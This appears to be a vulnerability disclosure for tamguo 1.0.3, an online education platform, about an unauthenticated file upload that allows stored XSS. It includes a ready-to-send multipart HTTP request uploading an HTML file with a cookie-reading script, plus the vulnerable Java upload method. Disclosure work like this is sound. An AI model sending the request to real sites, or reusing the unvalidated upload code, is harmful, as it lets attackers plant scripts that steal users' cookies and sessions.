# tamguo Unrestricted File Upload Leading to Stored XSS Vulnerability Report

## Introduction to Vulnerabilities

tamguo (Spring Boot 1.5.3, Apache Shiro 1.2.5) is an online education platform. The `/uploadFile` and `/imgUpload` endpoints in `FileUploadController.java` and `UEditorController.java` have no file type validation, and the Shiro security configuration maps `/**` to `anon` (anonymous access), making all APIs publicly accessible.

Attackers can upload arbitrary HTML/JavaScript files to the server. These files are served as static resources on the same origin, allowing attackers to execute stored XSS attacks, create phishing pages, or steal user cookies/CSRF tokens.

Affected Versions：1.0.3

## Vulnerability Reproduction

### Step 4: Burp Suite PoC

**Request**:

```
POST /uploadFile HTTP/1.1
Host: localhost:8081
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Length: 250

------WebKitFormBoundary
Content-Disposition: form-data; name="upfile"; filename="xss.html"
Content-Type: text/html

<html><script>alert(document.cookie)</script></html>
------WebKitFormBoundary--
```

![image-20260805094638005](https://github.com/fangtang7/picx-images-hosting/raw/master/tamgou/image-20260805094638005.2rvunk4ftd.webp)

The accessed file actually exists

![image-20260805094936078](https://github.com/fangtang7/picx-images-hosting/raw/master/tamgou/image-20260805094936078.7ehho93jzw.webp)

## Code Evidence

### FileUploadController.java (full vulnerable method)

```java
@RequestMapping(value = "/uploadFile", method = RequestMethod.POST)
@ResponseBody
public Ueditor imgUpload(MultipartFile upfile) throws IOException {
    if (!upfile.isEmpty()) {
        InputStream in = null;
        OutputStream out = null;
        try {
            String path = fileStoragePath + DateUtils.format(new Date(), "yyyyMMdd");
            File dir = new File(path);
            if (!dir.exists())
                dir.mkdirs();
            // ONLY the extension is extracted from the original filename
            // No file type whitelist, no content-type validation
            String fileName = this.getTeacherNo() + upfile.getOriginalFilename()
                .substring(upfile.getOriginalFilename().lastIndexOf("."));
            File serverFile = new File(dir + File.separator + fileName);
            // ...
            ueditor.setUrl("files" + "/" + DateUtils.format(new Date(), "yyyyMMdd") + "/" + fileName);
            return ueditor;
        } catch (Exception e) {
            // ...
        }
    }
}
```

![image-20260805100102426](https://github.com/fangtang7/picx-images-hosting/raw/master/tamgou/image-20260805100102426.2ksms4jebb.webp)
